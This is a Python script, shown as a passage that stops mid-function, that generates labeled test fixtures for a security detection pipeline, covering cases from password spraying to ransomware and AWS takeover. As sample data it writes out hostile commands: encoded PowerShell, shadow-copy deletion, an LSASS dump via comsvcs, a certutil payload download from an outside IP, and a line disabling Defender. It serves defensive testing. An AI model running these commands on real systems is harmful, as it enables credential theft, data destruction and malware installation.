"""Regenerate the labeled eval fixtures under data/eval/.

Each case is small and hand-labeled: these are the numbers every later phase is
measured against, so they need to be readable, not realistic in volume. Every
detection has at least one positive case, and the suite carries benign cases that
must stay quiet or be scored low.

    python scripts/make_eval_fixtures.py
"""
from __future__ import annotations

import json
import random
import shutil
from datetime import datetime, timedelta, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
EVAL = ROOT / "data" / "eval"
T0 = datetime(2026, 9, 2, 9, 0, tzinfo=timezone.utc)
UA_MAC = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/128.0"
UA_BOT = "python-requests/2.31.0"
UA_STUFF = "Mozilla/5.0 (compatible; OpenBullet2)"
USERS = ["john.doe", "asmith", "mgarcia", "jlee", "pwong", "rkhan", "tnguyen"]


def auth(ts, **kw):
    return {"ts": ts.isoformat(), "kind": "auth", **kw}


def ident(ts, **kw):
    return {"ts": ts.isoformat(), "kind": "identity", **kw}


def proc(ts, **kw):
    return {"ts": ts.isoformat(), "kind": "process", "source": "sysmon", **kw}


def net(ts, **kw):
    return {"ts": ts.isoformat(), "kind": "network", "source": "zeek", **kw}


def file_(ts, **kw):
    return {"ts": ts.isoformat(), "kind": "file", "source": "sysmon", **kw}


def cloud(ts, call, user="deploy-bot", ip="203.0.113.9", region="us-east-1", params=None, **raw):
    rec = {"eventTime": ts.isoformat(), "eventName": call, "awsRegion": region, "sourceIPAddress": ip,
           "userIdentity": {"type": "IAMUser", "userName": user}, "requestParameters": params or {},
           "recipientAccountId": "111122223333", **raw}
    return {"ts": ts.isoformat(), "kind": "cloud", "source": "cloudtrail", "provider": "aws", "api_call": call,
            "user": user, "source_ip": ip, "region": region, "account_id": "111122223333",
            "resource": str((params or {}).get("bucketName") or (params or {}).get("userName") or (params or {}).get("name") or ""),
            "outcome": "success", "raw": rec}


def endpoint_noise(start, n, seed, host="ws-20", user="rkhan"):
    rng = random.Random(seed)
    apps = [("explorer.exe", "chrome.exe", '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"'),
            ("explorer.exe", "outlook.exe", '"C:\\Program Files\\Microsoft Office\\OUTLOOK.EXE"'),
            ("services.exe", "svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p"),
            ("explorer.exe", "powershell.exe", "powershell.exe -NoProfile -Command Get-ChildItem C:\\Users"),
            ("explorer.exe", "excel.exe", '"C:\\Program Files\\Microsoft Office\\EXCEL.EXE" /n budget.xlsx')]
    out = []
    for i in range(n):
        par, name, cmd = rng.choice(apps)
        ts = start + timedelta(seconds=rng.randint(0, 3600))
        out.append(proc(ts, action="start", host=host, user=user, parent_name=par, process_name=name, command_line=cmd,
                        pid=1000 + i))
        out.append(net(ts, host=host, source_ip="10.0.4.20", dest_ip=rng.choice(["142.250.80.46", "52.96.0.10", "10.0.0.53"]),
                       dest_port=443, protocol="tcp", bytes_out=rng.randint(500, 90000), bytes_in=rng.randint(500, 900000)))
    return out


def noise(start, n, seed):
    """Benign internal traffic. Never enough failures from one IP to fire anything."""
    rng = random.Random(seed)
    ips = [f"10.0.{rng.randint(1, 9)}.{rng.randint(2, 250)}" for _ in range(20)]
    out = []
    for _ in range(n):
        ts = start + timedelta(seconds=rng.randint(0, 3600))
        out.append(auth(ts, source="splunk", event_type="login_failure" if rng.random() < 0.07 else "login_success",
                        user=rng.choice(USERS), source_ip=rng.choice(ips), host=rng.choice(["web-01", "jump-01", "ad-dc-01"]),
                        logon_type="network", user_agent=UA_MAC))
    return out


def write(name, events, spec, history=None):
    d = EVAL / name
    d.mkdir(parents=True, exist_ok=True)
    for fname, rows in (("events.jsonl", events), ("history.jsonl", history)):
        if rows is None:
            continue
        rows.sort(key=lambda r: r["ts"])
        with open(d / fname, "w") as f:
            for r in rows:
                f.write(json.dumps(r) + "\n")
    if history is not None:
        spec["history"] = "history.jsonl"
    (d / "expected.json").write_text(json.dumps(spec, indent=2) + "\n")
    n_inc = len(spec.get("incidents", []))
    print(f"{name}: {len(events)} events, {len(spec['alerts'])} alerts, {n_inc} incidents")


def us_history(user, days_ago=5, n=6, ip="72.14.201.9"):
    return [auth(T0 - timedelta(days=days_ago, hours=i), source="okta", event_type="login_success", user=user,
                 source_ip=ip, geo="US", host="web-01", user_agent=UA_MAC, logon_type="network") for i in range(n)]


TICKET = {"create_ticket": "execute", "notify": "execute"}


# ---------------------------------------------------------------- T1110 family
def case_brute_force():
    ip, base = "203.0.113.42", T0 + timedelta(minutes=10)
    evs = noise(T0, 120, 11)
    evs += [auth(base + timedelta(seconds=i * 7), source="splunk", event_type="login_failure", user="john.doe",
                 source_ip=ip, host="vpn-gw-01", user_agent=UA_BOT, outcome_reason="bad_password") for i in range(18)]
    evs.append(auth(base + timedelta(seconds=133), source="splunk", event_type="login_success", user="john.doe",
                    source_ip=ip, host="vpn-gw-01", user_agent=UA_BOT))
    write("01-brute-force-vpn", evs, {
        "name": "brute force on the VPN gateway, then a success",
        "description": "18 failures for one account from a Russian IP, followed by a login. Crown-jewel asset.",
        "alerts": [
            {"rule": "brute_force", "match": {"source_ip": ip, "user": "john.doe"}, "label": "true_positive"},
            {"rule": "new_geo_login", "match": {"user": "john.doe", "geo": "RU"}, "label": "true_positive",
             "note": "the attacker's successful login is also john.doe's first from Russia"},
        ],
        "incidents": [{"rules": ["brute_force", "new_geo_login"], "label": "true_positive", "risk_min": 80,
                       "expect_actions": {"block_ip": "execute", "lock_user": "approve", **TICKET}}],
    })


def case_password_spray():
    ip, base = "198.51.100.17", T0 + timedelta(minutes=25)
    evs = noise(T0, 120, 12)
    evs += [auth(base + timedelta(seconds=i * 11), source="okta", event_type="login_failure", user=u, source_ip=ip,
                 host="ad-dc-01", user_agent=UA_BOT, outcome_reason="bad_password") for i, u in enumerate(USERS * 2)]
    write("02-password-spray-idp", evs, {
        "name": "password spray against the IdP",
        "description": "14 failures across 7 accounts from one IP, two attempts each. No success.",
        "alerts": [{"rule": "password_spray", "match": {"source_ip": ip}, "label": "true_positive", "risk_min": 70,
                    "expect_actions": {"block_ip": "execute", **TICKET}}],
    })


def case_credential_stuffing():
    base = T0 + timedelta(minutes=20)
    ips = [f"185.220.10{i}.{20 + i}" for i in range(6)]
    targets = USERS + ["cwu", "dlopez", "efox", "gpatel", "hmori"]
    evs = noise(T0, 120, 17)
    for i, u in enumerate(targets):
        for j in range(2):
            evs.append(auth(base + timedelta(seconds=i * 23 + j * 5), source="okta", event_type="login_failure", user=u,
                            source_ip=ips[(i + j) % 6], host="okta", user_agent=UA_STUFF, outcome_reason="bad_password"))
    evs.append(auth(base + timedelta(seconds=300), source="okta", event_type="login_success", user="pwong",
                    source_ip=ips[2], host="okta", user_agent=UA_STUFF))
    write("07-credential-stuffing", evs, {
        "name": "credential stuffing from a proxy pool, one hit",
        "description": "12 accounts, 6 IPs, 2 tries per account, one shared automation user agent. pwong's leaked password works.",
        "alerts": [
            {"rule": "credential_stuffing", "match": {"source_ip": ips[0]}, "label": "true_positive"},
            {"rule": "new_geo_login", "match": {"user": "pwong"}, "label": "true_positive"},
        ],
        "incidents": [{"rules": ["credential_stuffing", "new_geo_login"], "label": "true_positive", "risk_min": 75,
                       "expect_actions": {"block_ip": "execute", "lock_user": "approve", **TICKET}}],
    })


def case_lockout_storm():
    ip, base = "203.0.113.77", T0 + timedelta(minutes=5)
    evs = noise(T0, 120, 18)
    for i, u in enumerate(USERS):
        for j in range(2):
            evs.append(auth(base + timedelta(seconds=i * 20 + j * 3), source="windows", event_type="login_failure", user=u,
                            source_ip=ip, host="ad-dc-01", outcome_reason="bad_password"))
        evs.append(auth(base + timedelta(seconds=i * 20 + 8), source="windows", event_type="lockout", user=u,
                        source_ip=ip, host="ad-dc-01"))
    write("16-lockout-storm", evs, {
        "name": "spray that overshoots the lockout threshold",
        "description": "Seven accounts, two failures each, all locked out, one external source.",
        "alerts": [
            {"rule": "password_spray", "match": {"source_ip": ip}, "label": "true_positive"},
            {"rule": "lockout_storm", "match": {"source_ip": ip}, "label": "true_positive"},
        ],
        "incidents": [{"rules": ["password_spray", "lockout_storm"], "label": "true_positive", "risk_min": 70,
                       "expect_actions": {"block_ip": "execute", **TICKET}}],
    })


# ---------------------------------------------------------------- sign-in anomalies
def case_impossible_travel():
    base = T0 + timedelta(minutes=40)
    evs = noise(T0, 120, 13)
    evs += [auth(base, source="okta", event_type="login_success", user="mgarcia", source_ip="72.14.201.9", geo="US",
                 host="web-01", user_agent=UA_MAC, logon_type="network"),
            auth(base + timedelta(minutes=22), source="okta", event_type="login_success", user="mgarcia",
                 source_ip="45.83.140.6", host="web-01", user_agent=UA_BOT, logon_type="network")]
    write("03-impossible-travel", evs, {
        "name": "impossible travel, US to DE in 22 minutes",
        "description": "Two successful logins for one account 7,000+ km apart. Device fingerprint also changes.",
        "alerts": [
            {"rule": "impossible_travel", "match": {"user": "mgarcia", "source_ip": "45.83.140.6"}, "label": "true_positive"},
            {"rule": "new_geo_login", "match": {"user": "mgarcia", "geo": "DE"}, "label": "true_positive"},
        ],
        "incidents": [{"rules": ["impossible_travel", "new_geo_login"], "label": "true_positive", "risk_min": 60,
                       "expect_actions": {"lock_user": "approve", **TICKET},
                       "note": "PB-007: never auto-block either leg, one of the two IPs is the real user."}],
    })


def case_new_geo_benign():
    evs = noise(T0, 120, 19)
    evs.append(auth(T0 + timedelta(minutes=30), source="okta", event_type="login_success", user="rkhan",
                    source_ip="81.2.69.160", geo="GB", host="web-01", user_agent=UA_MAC, logon_type="network"))
    write("08-new-geo-business-trip", evs, {
        "name": "first login from the UK, same laptop, nothing else",
        "description": "rkhan is on a business trip. Same device fingerprint, no failures, no follow-on activity.",
        "alerts": [{"rule": "new_geo_login", "match": {"user": "rkhan"}, "label": "false_positive", "risk_max": 60,
                    "expect_actions": TICKET}],
    }, history=us_history("rkhan"))


def case_dormant():
    evs = noise(T0, 120, 20)
    evs.append(auth(T0 + timedelta(minutes=33), source="okta", event_type="login_success", user="contractor-kb",
                    source_ip="72.14.201.40", geo="US", host="vpn-gw-01", user_agent=UA_MAC, logon_type="network"))
    write("10-dormant-account", evs, {
        "name": "contractor account wakes after 94 days",
        "description": "contractor-kb last signed in 94 days ago; the contract ended. Sign-in to the VPN.",
        "alerts": [{"rule": "dormant_account", "match": {"user": "contractor-kb"}, "label": "true_positive", "risk_min": 60,
                    "expect_actions": {"lock_user": "approve", **TICKET}}],
    }, history=us_history("contractor-kb", days_ago=94, n=4, ip="72.14.201.40"))


def case_session_replay():
    base = T0 + timedelta(minutes=12)
    evs = noise(T0, 120, 21)
    evs += [auth(base, source="okta", event_type="login_success", user="tnguyen", source_ip="72.14.201.77", geo="US",
                 host="okta", user_agent=UA_MAC, session_id="idx7Hq", logon_type="network"),
            auth(base + timedelta(minutes=41), source="okta", event_type="login_success", user="tnguyen",
                 source_ip="45.83.141.9", host="okta", user_agent=UA_BOT, session_id="idx7Hq", logon_type="network")]
    write("14-session-replay", evs, {
        "name": "stolen session cookie replayed from Germany",
        "description": "Same Okta session id, second IP, different client 41 minutes later.",
        "alerts": [
            {"rule": "session_anomaly", "match": {"user": "tnguyen"}, "label": "true_positive"},
            {"rule": "impossible_travel", "match": {"user": "tnguyen"}, "label": "true_positive"},
            {"rule": "new_geo_login", "match": {"user": "tnguyen", "geo": "DE"}, "label": "true_positive"},
        ],
        "incidents": [{"rules": ["session_anomaly", "impossible_travel"], "label": "true_positive", "risk_min": 80,
                       "expect_actions": {"block_ip": "execute", "lock_user": "approve", **TICKET},
                       "note": "PB-016: the replay IP is hostile and gets blocked; the origin IP is the real user."}],
    })


def case_service_account_rdp():
    evs = noise(T0, 120, 22)
    evs.append(auth(T0 + timedelta(minutes=47), source="windows", event_type="login_success", user="svc-sql",
                    source_ip="10.0.5.5", host="jump-01", logon_type="remote_interactive"))
    write("11-service-account-rdp", evs, {
        "name": "service account RDP into the jump host",
        "description": "svc-sql, which runs the database agents, opens an RDP session on jump-01.",
        "alerts": [{"rule": "service_account_interactive", "match": {"user": "svc-sql"}, "label": "true_positive",
                    "expect_actions": TICKET}],
    })


# ---------------------------------------------------------------- directory changes
def case_attack_chain():
    """The roadmap's scripted chain: spray -> success -> new MFA factor -> admin group add."""
    ip, base = "198.51.100.23", T0 + timedelta(minutes=15)
    evs = noise(T0, 150, 23)
    evs += [auth(base + timedelta(seconds=i * 9), source="okta", event_type="login_failure", user=u, source_ip=ip,
                 host="okta", user_agent=UA_BOT, outcome_reason="bad_password") for i, u in enumerate(USERS)]
    evs.append(auth(base + timedelta(seconds=75), source="okta", event_type="login_success", user="jlee",
                    source_ip=ip, host="okta", user_agent=UA_BOT))
    evs.append(ident(base + timedelta(minutes=11), source="okta", change_type="mfa_enrolled", user="jlee",
                     target_user="jlee", source_ip=ip, host="okta"))
    evs.append(ident(base + timedelta(minutes=24), source="windows", change_type="group_add", user="jlee",
                     target_user="jlee", group="Domain Admins", source_ip=ip, host="ad-dc-01"))
    write("09-identity-attack-chain", evs, {
        "name": "spray -> success -> new MFA factor -> Domain Admins",
        "description": "The chain the roadmap asks correlation to merge into one incident.",
        "alerts": [
            {"rule": "password_spray", "match": {"source_ip": ip}, "label": "true_positive"},
            {"rule": "new_geo_login", "match": {"user": "jlee"}, "label": "true_positive"},
            {"rule": "mfa_method_change", "match": {"user": "jlee"}, "label": "true_positive"},
            {"rule": "privileged_group_add", "match": {"user": "jlee"}, "label": "true_positive"},
        ],
        "incidents": [{"rules": ["password_spray", "mfa_method_change", "privileged_group_add"], "label": "true_positive",
                       "risk_min": 90, "expect_actions": {"block_ip": "execute", "lock_user": "approve", **TICKET}}],
    })


def case_create_then_privilege():
    base = T0 + timedelta(minutes=50)
    evs = noise(T0, 120, 24)
    evs.append(ident(base, source="windows", change_type="account_created", user="it-admin", target_user="support2",
                     host="ad-dc-01"))
    evs.append(ident(base + timedelta(minutes=8), source="windows", change_type="group_add", user="it-admin",
                     target_user="support2", group="Domain Admins", host="ad-dc-01"))
    write("13-create-then-privilege", evs, {
        "name": "new account in Domain Admins eight minutes after creation",
        "description": "it-admin creates support2 and makes it a domain admin. No ticket.",
        "alerts": [
            {"rule": "account_create_then_privilege", "match": {"user": "support2"}, "label": "true_positive"},
            {"rule": "privileged_group_add", "match": {"user": "support2"}, "label": "true_positive"},
        ],
        "incidents": [{"rules": ["account_create_then_privilege", "privileged_group_add"], "label": "true_positive",
                       "risk_min": 85, "expect_actions": {"lock_user": "approve", **TICKET}}],
    })


def case_reset_abuse():
    base = T0 + timedelta(minutes=8)
    evs = noise(T0, 120, 25)
    for i, u in enumerate(["cfo.smith", "asmith", "mgarcia", "jlee"]):
        evs.append(ident(base + timedelta(minutes=i * 5), source="okta", change_type="password_reset",
                         user="hd-operator7", target_user=u, host="okta", source_ip="10.0.8.14"))
    write("15-password-reset-abuse", evs, {
        "name": "one helpdesk operator resets four accounts in 15 minutes",
        "description": "No matching tickets. Includes the CFO.",
        "alerts": [{"rule": "password_reset_abuse", "match": {"user": "hd-operator7"}, "label": "true_positive",
                    "expect_actions": TICKET}],
    })


# ---------------------------------------------------------------- MFA
def case_mfa_fatigue():
    ip, base = "185.220.101.44", T0 + timedelta(minutes=50)
    evs = noise(T0, 120, 14)
    evs += [auth(base + timedelta(seconds=i * 80), source="okta", event_type="mfa_timeout" if i % 3 == 2 else "mfa_denied",
                 user="asmith", source_ip=ip, host="ad-dc-01", mfa_factor="push", outcome_reason="user_rejected",
                 user_agent=UA_BOT) for i in range(7)]
    evs.append(auth(base + timedelta(seconds=600), source="okta", event_type="mfa_success", user="asmith",
                    source_ip=ip, host="ad-dc-01", mfa_factor="push", user_agent=UA_BOT))
    evs.append(auth(base + timedelta(seconds=605), source="okta", event_type="login_success", user="asmith",
                    source_ip=ip, host="ad-dc-01", user_agent=UA_BOT, logon_type="network"))
    write("04-mfa-fatigue-approved", evs, {
        "name": "MFA push bombing ending in an approval",
        "description": "Seven denied or timed-out pushes in nine minutes, then the user taps approve.",
        "alerts": [
            {"rule": "mfa_fatigue", "match": {"user": "asmith", "source_ip": ip}, "label": "true_positive"},
            {"rule": "new_geo_login", "match": {"user": "asmith", "geo": "NL"}, "label": "true_positive"},
        ],
        "incidents": [{"rules": ["mfa_fatigue", "new_geo_login"], "label": "true_positive", "risk_min": 80,
                       "expect_actions": {"block_ip": "execute", "lock_user": "approve", **TICKET}}],
    })


# ---------------------------------------------------------------- benign
def case_service_account_fp():
    ip, base = "10.0.7.31", T0 + timedelta(minutes=15)
    evs = noise(T0, 120, 15)
    evs += [auth(base + timedelta(seconds=i * 12), source="splunk", event_type="login_failure", user="svc-backup",
                 source_ip=ip, host="jump-01", logon_type="service", outcome_reason="bad_password") for i in range(14)]
    write("05-service-account-fp", evs, {
        "name": "service account failing after a credential rotation",
        "description": "Textbook false positive: svc-backup grinding from an internal host with a stale secret.",
        "alerts": [{"rule": "brute_force", "match": {"source_ip": ip, "user": "svc-backup"}, "label": "false_positive",
                    "risk_max": 40, "expect_actions": TICKET,
                    "note": "Detection firing is correct. Auto-blocking an internal host is not."}],
    })


def case_quiet_hour():
    write("06-quiet-hour", noise(T0, 400, 16), {
        "name": "an hour of ordinary traffic",
        "description": "Nothing should fire. Anything that does is a false positive.",
        "alerts": [],
    })


def case_single_reset():
    evs = noise(T0, 200, 26)
    evs.append(ident(T0 + timedelta(minutes=9), source="okta", change_type="password_reset", user="hd-operator2",
                     target_user="pwong", host="okta", source_ip="10.0.8.15"))
    evs.append(auth(T0 + timedelta(minutes=10), source="windows", event_type="login_success", user="jlee",
                    source_ip="10.0.2.2", host="jump-01", logon_type="remote_interactive"))
    write("17-routine-helpdesk-and-rdp", evs, {
        "name": "one password reset and a normal admin RDP session",
        "description": "Routine operations that look like two of the rules and must not fire.",
        "alerts": [],
    })


# ---------------------------------------------------------------- Phase 4: endpoint, network, cloud
def case_phish_chain():
    """The roadmap's cross-domain chain: phish click -> macro spawns PowerShell -> beaconing
    -> lateral SMB -> new admin account."""
    base, host, ip, c2 = T0 + timedelta(minutes=5), "ws-17", "10.0.4.17", "185.220.101.66"
    evs = endpoint_noise(T0, 40, 31) + noise(T0, 60, 31)
    evs.append(proc(base, action="start", host=host, user="jlee", parent_name="winword.exe", process_name="powershell.exe",
                    command_line="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
                    pid=4242))
    for i in range(12):
        evs.append(net(base + timedelta(seconds=60 + i * 300 + (i % 3) * 7), host=host, source_ip=ip, dest_ip=c2,
                       dest_port=443, protocol="tcp", bytes_out=1400, bytes_in=320, process_name="powershell.exe"))
    for i in range(7):
        evs.append(net(base + timedelta(minutes=40, seconds=i * 9), host=host, source_ip=ip, dest_ip=f"10.0.6.{20 + i}",
                       dest_port=445, protocol="tcp", bytes_out=5000, bytes_in=3000))
    evs.append(ident(base + timedelta(minutes=52), source="windows", change_type="account_created", user="jlee",
                     target_user="svc-backup2", host="ad-dc-01"))
    evs.append(ident(base + timedelta(minutes=53), source="windows", change_type="group_add", user="jlee",
                     target_user="svc-backup2", group="Domain Admins", host="ad-dc-01"))
    write("18-phish-to-domain-admin", evs, {
        "name": "phish -> macro PowerShell -> beacon -> SMB fan-out -> new domain admin",
        "description": "Cross-domain chain on ws-17 and jlee, the one the Phase 4 exit criteria ask for.",
        "alerts": [
            {"rule": "suspicious_parent_child", "match": {"host": host}, "label": "true_positive"},
            {"rule": "encoded_powershell", "match": {"host": host}, "label": "true_positive"},
            {"rule": "beaconing", "match": {"source_ip": c2}, "label": "true_positive"},
            {"rule": "lateral_movement_fanout", "match": {"host": host}, "label": "true_positive"},
            {"rule": "account_create_then_privilege", "match": {"user": "svc-backup2"}, "label": "true_positive"},
            {"rule": "privileged_group_add", "match": {"user": "svc-backup2"}, "label": "true_positive"},
        ],
        "incidents": [{"rules": ["suspicious_parent_child", "beaconing", "lateral_movement_fanout", "privileged_group_add"],
                       "label": "true_positive", "risk_min": 90,
                       "expect_actions": {"isolate_host": "execute", "block_ip": "execute", "lock_user": "approve", **TICKET}}],
    })


def case_ransomware():
    base, host = T0 + timedelta(minutes=20), "fs-02"
    evs = endpoint_noise(T0, 40, 32, host="fs-02", user="svc-files")
    evs.append(proc(base, action="start", host=host, user="svc-files", parent_name="cmd.exe", process_name="vssadmin.exe",
                    command_line="vssadmin.exe delete shadows /all /quiet", pid=700))
    evs.append(proc(base + timedelta(seconds=4), action="start", host=host, user="svc-files", parent_name="cmd.exe",
                    process_name="bcdedit.exe", command_line="bcdedit /set {default} recoveryenabled No", pid=701))
    for i in range(90):
        evs.append(file_(base + timedelta(seconds=30 + i * 0.4), host=host, user="svc-files", process_name="svch0st.exe",
                         action="rename", path=f"D:\\Shares\\Finance\\q{i:03d}.xlsx.lockbit",
                         old_path=f"D:\\Shares\\Finance\\q{i:03d}.xlsx"))
    evs.append(file_(base + timedelta(seconds=70), host=host, user="svc-files", process_name="svch0st.exe", action="create",
                     path="D:\\Shares\\Finance\\README_RESTORE.txt"))
    write("19-ransomware", evs, {
        "name": "shadow copies deleted, then mass encryption on the file server",
        "description": "vssadmin and bcdedit, then 90 files renamed to .lockbit in 36 seconds with a ransom note.",
        "alerts": [
            {"rule": "ransomware_precursor", "match": {"host": host}, "label": "true_positive"},
            {"rule": "ransomware_precursor", "match": {"host": host}, "label": "true_positive"},
            {"rule": "mass_file_encryption", "match": {"host": host}, "label": "true_positive"},
        ],
        "incidents": [{"rules": ["ransomware_precursor", "mass_file_encryption"], "label": "true_positive", "risk_min": 95,
                       "expect_actions": {"isolate_host": "execute", **TICKET}}],
    })


def case_cred_dump_and_cleanup():
    base, host = T0 + timedelta(minutes=30), "ws-31"
    evs = endpoint_noise(T0, 30, 33, host=host, user="pwong")
    evs.append(proc(base, action="start", host=host, user="pwong", parent_name="cmd.exe", process_name="rundll32.exe",
                    command_line="rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 612 C:\\Users\\Public\\l.dmp full",
                    pid=900))
    evs.append(proc(base + timedelta(minutes=3), action="log_cleared", host=host, user="pwong", process_name="eventlog",
                    target="Security"))
    write("20-credential-dump-and-log-clear", evs, {
        "name": "comsvcs MiniDump of LSASS, then the Security log cleared",
        "description": "Credential theft followed by anti-forensics on the same workstation.",
        "alerts": [
            {"rule": "credential_dumping", "match": {"host": host}, "label": "true_positive"},
            {"rule": "lolbin_abuse", "match": {"host": host}, "label": "true_positive",
             "note": "rundll32 running comsvcs from a user-writable path matches the rundll32 LOLBin pattern too"},
            {"rule": "log_clearing", "match": {"host": host}, "label": "true_positive"},
        ],
        "incidents": [{"rules": ["credential_dumping", "log_clearing"], "label": "true_positive", "risk_min": 90,
                       "expect_actions": {"isolate_host": "execute", **TICKET}}],
    })


def case_lolbin_persistence_tamper():
    base, host = T0 + timedelta(minutes=12), "ws-44"
    evs = endpoint_noise(T0, 30, 34, host=host, user="tnguyen")
    evs.append(proc(base, action="start", host=host, user="tnguyen", parent_name="cmd.exe", process_name="certutil.exe",
                    command_line="certutil.exe -urlcache -split -f http://185.220.101.70/u.bin C:\\ProgramData\\u.exe", pid=510))
    evs.append(proc(base + timedelta(minutes=1), action="task_created", host=host, user="tnguyen", process_name="schtasks",
                    target="\\OneDriveUpdate", command_line="C:\\ProgramData\\u.exe"))
    evs.append(proc(base + timedelta(minutes=2), action="start", host=host, user="tnguyen", parent_name="cmd.exe",
                    process_name="powershell.exe", command_line="powershell Set-MpPreference -DisableRealtimeMonitoring $true",
                    pid=511))
    write("21-lolbin-persistence-tamper", evs, {
        "name": "certutil download, scheduled task, Defender switched off",
        "description": "Payload fetched with a signed binary, persisted as a task, then protection disabled.",
        "alerts": [
            {"rule": "lolbin_abuse", "match": {"host": host}, "label": "true_positive"},
            {"rule": "persistence_mechanism", "match": {"host": host}, "label": "true_positive"},
            {"rule": "security_tool_tamper", "match": {"host": host}, "label": "true_positive"},
        ],
        "incidents": [{"rules": ["lolbin_abuse", "persistence_mechanism", "security_tool_tamper"], "label": "true_positive",
                       "risk_min": 85, "expect_actions": {"isolate_host": "execute", **TICKET}}],
    })


def case_dns_tunnel():
    rng = random.Random(35)
    base, host = T0 + timedelta(minutes=3), "ws-52"
    evs = endpoint_noise(T0, 30, 35, host=host, user="cwu")
    for i in range(45):
        label = "".join(rng.choice("abcdefghijklmnopqrstuvwxyz234567") for _ in range(40))
        evs.append(net(base + timedelta(seconds=i * 20), host=host, source_ip="10.0.4.52", dest_ip="10.0.0.53", dest_port=53,
                       protocol="dns", dns_type="TXT" if i % 4 == 0 else "A", domain=f"{label}.x7-cdn-sync.net"))
    write("22-dns-tunneling", evs, {
        "name": "data smuggled in DNS labels",
        "description": "45 lookups of 40-character base32 labels under one freshly registered domain.",
        "alerts": [{"rule": "dns_tunneling", "match": {"host": host}, "label": "true_positive", "risk_min": 70,
                    "expect_actions": {"isolate_host": "execute", **TICKET}}],
    })


def case_internal_scan():
    base = T0 + timedelta(minutes=14)
    evs = endpoint_noise(T0, 20, 36)
    evs += [net(base + timedelta(seconds=i), host="ws-60", source_ip="10.0.4.60", dest_ip="10.0.9.10", dest_port=p,
                protocol="tcp", action="blocked") for i, p in enumerate([21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 389, 443,
                                                                         445, 993, 1433, 1521, 3306, 3389, 5432, 5900, 5985, 8080])]
    write("23-internal-port-scan", evs, {
        "name": "workstation scanning a server",
        "description": "22 ports on one server in 22 seconds, nearly all rejected.",
        "alerts": [{"rule": "port_scan", "match": {"source_ip": "10.0.4.60"}, "label": "true_positive",
                    "expect_actions": TICKET}],
    })


def case_exfil():
    base, host = T0 + timedelta(minutes=10), "fs-01"
    history = [net(T0 - timedelta(days=d), host=host, source_ip="10.0.3.10", dest_ip="52.216.10.5", dest_port=443,
                   protocol="tcp", bytes_out=900_000_000, domain="backup.s3.amazonaws.com") for d in (1, 2, 3)]
    evs = endpoint_noise(T0, 20, 37, host=host, user="svc-files")
    evs += [net(base + timedelta(minutes=i), host=host, source_ip="10.0.3.10", dest_ip="198.51.100.200", dest_port=443,
                protocol="tcp", bytes_out=120_000_000, domain="gfs302n.mega.co.nz", process_name="rclone.exe") for i in range(7)]
    evs += [net(base + timedelta(minutes=30), host=host, source_ip="10.0.3.10", dest_ip="52.216.10.5", dest_port=443,
                protocol="tcp", bytes_out=900_000_000, domain="backup.s3.amazonaws.com")]
    write("24-exfil-rclone", evs, {
        "name": "840 MB to MEGA with rclone; the nightly S3 backup stays quiet",
        "description": "New destination and large volume fires; the known backup destination does not.",
        "alerts": [{"rule": "data_exfiltration", "match": {"source_ip": "198.51.100.200"}, "label": "true_positive",
                    "risk_min": 80, "expect_actions": {"block_ip": "execute", "isolate_host": "execute", **TICKET}}],
    }, history=history)


def case_ioc():
    evs = endpoint_noise(T0, 20, 38)
    evs.append(net(T0 + timedelta(minutes=33), host="ws-20", source_ip="10.0.4.20", dest_ip="50.16.16.211", dest_port=443,
                   protocol="tcp", bytes_out=2400, bytes_in=800))
    spec = {"name": "connection to a Feodo-listed QakBot C2",
            "description": "One HTTPS session to an IP on the abuse.ch Feodo list.",
            "iocs": [{"type": "ip", "value": "50.16.16.211", "source": "feodo", "confidence": 90,
                      "tags": {"malware": "QakBot", "status": "online"}},
                     {"type": "ip", "value": "142.250.80.46", "source": "tor_exit", "confidence": 30, "tags": {}}],
            "alerts": [{"rule": "intel_ioc_match", "match": {"source_ip": "50.16.16.211"}, "label": "true_positive",
                        "expect_actions": {"block_ip": "execute", **TICKET},
                        "note": "the Tor-listed IP in the same traffic is below the confidence floor and must not fire"}]}
    write("25-intel-c2-hit", evs, spec)


def case_cloud_takeover():
    base = T0 + timedelta(minutes=5)
    evs = [cloud(base, "ConsoleLogin", responseElements={"ConsoleLogin": "Success"}, additionalEventData={"MFAUsed": "No"}),
           cloud(base + timedelta(minutes=2), "CreateAccessKey", params={"userName": "ci-admin"}),
           cloud(base + timedelta(minutes=3), "AttachUserPolicy",
                 params={"userName": "deploy-bot", "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"}),
           cloud(base + timedelta(minutes=5), "StopLogging", params={"name": "org-trail"}),
           cloud(base + timedelta(minutes=9), "RunInstances", region="ap-south-1", params={"instanceType": "p4d.24xlarge"})]
    evs += [cloud(T0 + timedelta(minutes=m), "DescribeInstances", user="ops-ro", ip="10.0.1.5") for m in range(0, 60, 6)]
    write("26-cloud-takeover", evs, {
        "name": "console login without MFA -> access key for an admin -> AdministratorAccess -> trail stopped -> GPUs in Mumbai",
        "description": "A leaked IAM password used end to end in nine minutes.",
        "alerts": [
            {"rule": "console_login_no_mfa", "match": {"user": "deploy-bot"}, "label": "true_positive"},
            {"rule": "new_access_key", "match": {"user": "deploy-bot"}, "label": "true_positive"},
            {"rule": "iam_admin_grant", "match": {"user": "deploy-bot"}, "label": "true_positive"},
            {"rule": "cloud_logging_disabled", "match": {"user": "deploy-bot"}, "label": "true_positive"},
            {"rule": "unusual_region", "match": {"user": "deploy-bot"}, "label": "true_positive"},
        ],
        "incidents": [{"rules": ["console_login_no_mfa", "iam_admin_grant", "cloud_logging_disabled", "unusual_region"],
                       "label": "true_positive", "risk_min": 90,
                       "expect_actions": {"disable_access_key": "execute", **TICKET}}],
    })


def case_public_bucket_and_forwarding():
    base = T0 + timedelta(minutes=5)
    pol = {"Statement": [{"Effect": "Allow", "Principal": "*", "Action": "s3:GetObject", "Resource": "arn:aws:s3:::corp-exports/*"}]}
    evs = [cloud(base, "PutBucketPolicy", user="analyst-kb", ip="10.0.1.9", params={"bucketName": "corp-exports", "bucketPolicy": pol})]
